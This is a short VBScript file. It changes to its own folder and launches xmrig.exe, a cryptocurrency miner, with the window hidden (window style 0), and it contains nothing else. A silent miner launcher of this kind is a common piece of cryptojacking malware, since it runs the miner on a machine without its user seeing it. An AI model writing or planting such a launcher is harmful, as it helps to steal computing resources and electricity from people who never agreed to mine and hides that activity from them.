Set Fso      = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
Dim VbsDir   : VbsDir = Fso.GetParentFolderName(WScript.ScriptFullName)
WshShell.CurrentDirectory = VbsDir
WshShell.Run """" & VbsDir & "\xmrig.exe""", 0, False